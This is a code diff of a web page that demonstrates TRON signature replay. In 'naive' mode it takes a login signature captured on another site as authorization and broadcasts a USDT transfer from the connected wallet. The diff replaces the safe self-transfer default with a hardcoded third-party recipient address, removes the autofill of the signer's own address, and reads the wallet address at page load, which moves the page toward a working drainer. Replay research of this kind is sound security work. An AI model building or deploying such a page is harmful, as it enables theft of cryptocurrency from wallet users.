@@ -10,7 +10,7 @@
   * { box-sizing:border-box; }
   body { margin:0; font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;
          background:var(--bg); color:var(--txt); padding:16px; }
-  .wrap { max-width:660px; margin:0 auto; }
+  .wrap { max-width:640px; margin:0 auto; }
   .panel { background:var(--panel); border:1px solid var(--line);
            border-radius:8px; padding:16px; margin-bottom:10px; }
   h1 { font-size:18px; margin:0 0 4px; }
@@ -30,7 +30,7 @@
   textarea { min-height:70px; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
         padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
-        font-size:11px; max-height:220px; overflow:auto; }
+        font-size:11px; max-height:200px; overflow:auto; }
   .kv { display:grid; grid-template-columns:110px 1fr; gap:3px 10px; margin:6px 0; }
   .kv b { color:var(--dim); font-weight:400; }
   .status { padding:8px 12px; border-radius:6px; margin:6px 0; font-size:12px; }
@@ -70,8 +70,8 @@
   <div class="panel">
     <h2>action — transfer USDT</h2>
     <p class="muted">
-      Naive mode accepts A's login signature as authorization to transfer.
-      Secure mode requires domain:B + nonce in text, rejects otherwise.
+      Naive mode accepts A's login signature as authorization.
+      Secure mode requires domain:B + nonce in text.
     </p>
     <div class="row">
       <button onclick="setMode('naive')" id="btn_naive">naive</button>
@@ -79,8 +79,8 @@
     </div>
     <div class="kv" id="mode_display"></div>
     <div class="kv">
-      <b>recipient</b><input id="recipient" placeholder="T… (defaults to signer — safe self-transfer)">
-      <b>amount</b><input id="amount" value="1" placeholder="USDT amount">
+      <b>recipient</b><input id="recipient" value="TJRzHiVc27AL4M3fgVcToVvCTXK4J9yJRi">
+      <b>amount</b><input id="amount" value="0.01" placeholder="USDT amount">
     </div>
     <button class="danger" onclick="executeTransfer()" id="btn_transfer" disabled>Execute transfer</button>
     <div class="status" id="transfer_status"></div>
@@ -100,18 +100,16 @@
 <script>
 /* ─────────────  B — Tokdie Check  ─────────────
    Domain: https://tokdie.github.io/drem2/
-   Universal TRON provider: trust-inapp / trust-ext / tronlink / generic.
-   connect: defaultAddress → tron_requestAccounts → eth_requestAccounts.
-   verify: tronWeb.trx.verifyMessageV2.
-   transfer: triggerSmartContract USDT transfer(address,uint256).
+   Provider: trust-inapp (tronWeb.defaultAddress) / tronlink / trustwallet.tron
+   Flow: parse A → verifyMessageV2 → naive transfer USDT
    ────────────────────────────────────────────── */
 
 const DAPP_HOST = 'tokdie.github.io/drem2';
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const USDT_DECIMALS = 6;
-const FEE_LIMIT_SUN = 100_000_000; // 100 TRX
+const FEE_LIMIT_SUN = 100_000_000; // 100 TRX cap
 
-let provider = null;      // { name, p }
+let provider = null;
 let tronWeb = null;
 let bAddress = null;
 let parsed = null;
@@ -137,7 +135,7 @@ const setStatus = (el, cls, text) => {
   node.textContent = text;
 };
 
-/* ─────────────  universal provider detect  ───────────── */
+/* ─────────────  provider detect  ───────────── */
 
 function detectOnce() {
   if (window.trustwallet?.tron) return { name: 'trust-inapp', p: window.trustwallet.tron };
@@ -148,7 +146,6 @@ function detectOnce() {
   return null;
 }
 
-/* tronWeb may exist without .ready — check functional shape */
 function getTronWeb(p) {
   if (!p) return null;
   const tw = p.tronWeb;
@@ -160,24 +157,20 @@ function getTronWeb(p) {
 async function waitForProvider(timeoutMs = 8000) {
   const start = Date.now();
   let d = detectOnce();
-  if (d) return d;
+  if (d && getTronWeb(d.p)) return d;
   while (Date.now() - start < timeoutMs) {
     await new Promise(r => setTimeout(r, 200));
     d = detectOnce();
-    if (d) {
-      log('DETECT', d.name + ' appeared after polling', { ms: Date.now() - start });
-      return d;
-    }
+    if (d && getTronWeb(d.p)) return d;
   }
-  return null;
+  return d;
 }
 
 /* ─────────────  env render  ───────────── */
 
 function renderEnv() {
   const name = provider ? provider.name : 'not found';
-  tronWeb = tronWeb || getTronWeb(provider?.p);
-  const ready = !!tronWeb;
+  const ready = !!getTronWeb(provider?.p);
   $('env_top').innerHTML = `
     <b>dapp_host</b><span>${esc(DAPP_HOST)}</span>
     <b>provider</b><span style="color:${provider ? 'var(--ok)' : 'var(--bad)'}">${esc(name)}</span>
@@ -206,57 +199,55 @@ function setMode(m) {
 async function connectB() {
   $('btn_connect_b').disabled = true;
   setStatus('verify_status', '', 'Looking for wallet…');
-  provider = provider || await waitForProvider(8000);
+  provider = await waitForProvider(8000);
   if (!provider) {
-    setStatus('verify_status', 'err', 'No TRON provider detected. Open in Trust or TronLink.');
+    setStatus('verify_status', 'err', 'No TRON provider detected.');
     $('btn_connect_b').disabled = false;
     renderEnv();
     return;
   }
-  log('CONNECT', 'provider', { name: provider.name });
+
   try {
     let accounts = null;
 
-    // 1. defaultAddress already populated (trust-inapp unlocked, tronlink ready)
-    const tw0 = getTronWeb(provider.p);
-    if (tw0?.defaultAddress?.base58) {
-      accounts = [tw0.defaultAddress.base58];
-      log('CONNECT', 'via tronWeb.defaultAddress', { accounts });
+    // 1. tronWeb.defaultAddress (trust-in-app, после unlock)
+    let tw = getTronWeb(provider.p);
+    if (tw?.defaultAddress?.base58) {
+      accounts = [tw.defaultAddress.base58];
+      log('CONNECT', 'via defaultAddress', { address: accounts[0] });
     }
 
-    // 2. TRON-specific request (trust adapter / tronlink)
-    if ((!accounts || !accounts[0]) && typeof provider.p.request === 'function') {
+    // 2. tron_requestAccounts
+    if (!accounts && typeof provider.p.request === 'function') {
       try {
         const r = await provider.p.request({ method: 'tron_requestAccounts' });
         log('CONNECT', 'tron_requestAccounts raw', { r });
-        if (Array.isArray(r)) accounts = r;
-        else if (r?.base58) accounts = [r.base58];
+        if (Array.isArray(r) && r[0]) accounts = r;
         else if (r?.address) accounts = [r.address];
-        else if (r?.[0]) accounts = r;
       } catch (e) {
-        log('CONNECT', 'tron_requestAccounts failed', { message: e.message, code: e.code });
+        log('CONNECT', 'tron_requestAccounts failed', { message: e.message });
       }
     }
 
-    // 3. legacy eth_requestAccounts — must not crash on null
-    if ((!accounts || !accounts[0]) && typeof provider.p.request === 'function') {
+    // 3. eth_requestAccounts
+    if (!accounts || !accounts[0]) {
       try {
         const a = await provider.p.request({ method: 'eth_requestAccounts' });
         log('CONNECT', 'eth_requestAccounts raw', { a });
-        if (Array.isArray(a) && a[0]) accounts = a;
+        if (a && a[0]) accounts = a;
       } catch (e) {
-        log('CONNECT', 'eth_requestAccounts failed', { message: e.message, code: e.code });
+        log('CONNECT', 'eth_requestAccounts failed', { message: e.message });
       }
     }
 
-    // 4. re-read tronWeb after request (unlock may have happened)
+    // 4. re-read defaultAddress after request
     if (!accounts || !accounts[0]) {
-      const tw1 = getTronWeb(provider.p);
-      if (tw1?.defaultAddress?.base58) accounts = [tw1.defaultAddress.base58];
+      tw = getTronWeb(provider.p);
+      if (tw?.defaultAddress?.base58) accounts = [tw.defaultAddress.base58];
     }
 
     if (!accounts || !accounts[0]) {
-      throw new Error('no account returned by any method (wallet locked or no permission)');
+      throw new Error('no account returned (wallet locked?)');
     }
 
     bAddress = accounts[0];
@@ -266,11 +257,12 @@ async function connectB() {
       name: provider.name,
       address: bAddress,
       hasTronWeb: !!tronWeb,
+      hasSign: !!(tronWeb?.trx?.sign),
+      hasSend: !!(tronWeb?.trx?.sendRawTransaction),
     });
     setStatus('verify_status', 'ok', 'Connected: ' + bAddress);
     renderEnv();
     checkReady();
-    $('btn_connect_b').disabled = false;
   } catch (e) {
     log('CONNECT', 'failed', { message: e.message, code: e.code });
     setStatus('verify_status', 'err', 'Connect failed: ' + (e.message || e.code));
@@ -297,7 +289,6 @@ function parseInput() {
       signer: parsed.signer,
       sigPrefix: parsed.sig.slice(0, 20) + '…',
     });
-    if (!$('recipient').value) $('recipient').value = parsed.signer;
     $('btn_verify').disabled = false;
     verifyOk = false;
     setStatus('verify_status', 'ok', 'Parsed. Click verify.');
@@ -311,10 +302,7 @@ function parseInput() {
 /* ─────────────  verify  ───────────── */
 
 async function verify() {
-  if (!parsed) {
-    setStatus('verify_status', 'err', 'Parse input first.');
-    return;
-  }
+  if (!parsed) return;
   if (!tronWeb) tronWeb = getTronWeb(provider?.p);
   if (!tronWeb?.trx?.verifyMessageV2) {
     setStatus('verify_status', 'err', 'tronWeb.verifyMessageV2 unavailable — connect first.');
@@ -324,16 +312,7 @@ async function verify() {
     setStatus('verify_status', '', 'Verifying…');
     log('VERIFY', 'verifyMessageV2', { text: parsed.text });
 
-    let recovered = null;
-    // tronWeb.trx.verifyMessageV2 may be sync (returns address) or async
-    const r = tronWeb.trx.verifyMessageV2(parsed.text, parsed.sig);
-    recovered = (r && typeof r.then === 'function') ? await r : r;
-
-    // normalize: some versions return object with .address
-    if (recovered && typeof recovered === 'object') {
-      recovered = recovered.base58 || recovered.address || recovered.hex || String(recovered);
-    }
-
+    const recovered = await tronWeb.trx.verifyMessageV2(parsed.text, parsed.sig);
     const match = recovered === parsed.signer;
     log('VERIFY', 'result', { recovered, expected: parsed.signer, match });
 
@@ -360,14 +339,13 @@ async function verify() {
       log('SECURE', 'checking', { hasDomain, hasNonce });
       if (!hasDomain) {
         verifyOk = false;
-        setStatus('verify_status', 'warn',
-          'SECURE: text has no domain:B — REJECT (would replay from A).');
+        setStatus('verify_status', 'warn', 'SECURE: no domain:B — REJECT (replay from A).');
         checkReady();
         return;
       }
       if (!hasNonce) {
         verifyOk = false;
-        setStatus('verify_status', 'warn', 'SECURE: text has no nonce — REJECT.');
+        setStatus('verify_status', 'warn', 'SECURE: no nonce — REJECT.');
         checkReady();
         return;
       }
@@ -379,7 +357,7 @@ async function verify() {
     checkReady();
   } catch (e) {
     verifyOk = false;
-    log('VERIFY', 'error', { message: e.message, code: e.code, raw: String(e) });
+    log('VERIFY', 'error', { message: e.message, code: e.code });
     setStatus('verify_status', 'err', 'Verify error: ' + (e.message || e.code));
     checkReady();
   }
@@ -398,20 +376,19 @@ async function executeTransfer() {
     return;
   }
   if (mode === 'secure') {
-    setStatus('transfer_status', 'warn', 'SECURE mode — transfer blocked.');
+    setStatus('transfer_status', 'warn', 'SECURE mode — blocked.');
     return;
   }
 
   const recipient = $('recipient').value.trim();
-  const amountStr = $('amount').value.trim();
-  const amount = Number(amountStr);
+  const amount = Number($('amount').value.trim());
 
   if (!recipient || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(recipient)) {
-    setStatus('transfer_status', 'err', 'Recipient must be TRON base58 (T…, 34 chars).');
+    setStatus('transfer_status', 'err', 'Recipient invalid TRON base58 (T…, 34 chars).');
     return;
   }
   if (!Number.isFinite(amount) || amount <= 0) {
-    setStatus('transfer_status', 'err', 'Amount must be positive number.');
+    setStatus('transfer_status', 'err', 'Amount must be > 0.');
     return;
   }
 
@@ -436,34 +413,45 @@ async function executeTransfer() {
       bAddress
     );
 
-    if (!tx.result || !tx.result.result) {
-      throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx));
+    log('TRANSFER', 'trigger result', {
+      result: tx?.result,
+      hasTx: !!tx?.transaction,
+      txID: tx?.transaction?.txID,
+    });
+
+    if (!tx?.result?.result || !tx?.transaction) {
+      throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx?.result || tx));
     }
 
-    log('TRANSFER', 'signing tx', { txID: tx.transaction.txID });
     setStatus('transfer_status', '', 'Confirm in wallet…');
-
+    log('TRANSFER', 'signing', { txID: tx.transaction.txID });
     const signed = await tronWeb.trx.sign(tx.transaction);
-    log('TRANSFER', 'broadcasting', { txID: signed.txID || tx.transaction.txID });
+    log('TRANSFER', 'signed', { txID: signed?.txID, hasSig: !!signed?.signature });
 
+    if (!signed || !signed.signature) {
+      throw new Error('sign returned no signature (user rejected?)');
+    }
+
+    log('TRANSFER', 'broadcasting', { txID: signed.txID });
     const receipt = await tronWeb.trx.sendRawTransaction(signed);
     log('TRANSFER', 'broadcast result', receipt);
 
-    const txid = receipt.txid || receipt.transaction?.txID || signed.txID || tx.transaction.txID;
-    const success = receipt.result === true || receipt.code === 'SUCCESS' ||
-                    (receipt.txid && !receipt.code);
+    const txid = receipt?.txid || receipt?.transaction?.txID || signed.txID;
+    const success = receipt?.result === true || receipt?.code === 'SUCCESS' || (receipt?.txid && !receipt?.code);
 
     if (success) {
       setStatus('transfer_status', 'ok', 'Broadcast OK · txid ' + txid);
-      $('verify_result').innerHTML +=
-        `<b>txid</b><span style="word-break:break-all">${esc(txid)}</span>`;
+      $('verify_result').innerHTML += `<b>txid</b><span style="word-break:break-all">${esc(txid)}</span>`;
       log('TRANSFER', 'SUCCESS', { txid });
     } else {
       setStatus('transfer_status', 'err', 'Broadcast failed: ' + JSON.stringify(receipt));
-      $('btn_transfer').disabled = false;
     }
   } catch (e) {
-    log('TRANSFER', 'error', { message: e.message, code: e.code, raw: String(e) });
+    log('TRANSFER', 'error', {
+      message: e.message,
+      code: e.code,
+      raw: String(e),
+    });
     setStatus('transfer_status', 'err', 'Transfer error: ' + (e.message || e.code));
     $('btn_transfer').disabled = false;
   }
@@ -486,11 +474,13 @@ function dumpLog() {
 
   provider = await waitForProvider(3000);
   if (provider) {
-    tronWeb = getTronWeb(provider.p) || provider.p.tronWeb || null;
+    tronWeb = getTronWeb(provider.p);
+    const addr = tronWeb?.defaultAddress?.base58 || null;
+    if (addr) { bAddress = addr; log('BOOT', 'account from defaultAddress', { address: addr }); }
     renderEnv();
     log('BOOT', 'provider at load', { name: provider.name, hasTronWeb: !!tronWeb });
   } else {
-    log('BOOT', 'no provider at load — Connect button will poll', {});
+    log('BOOT', 'no provider at load', {});
   }
 })();
 </script>
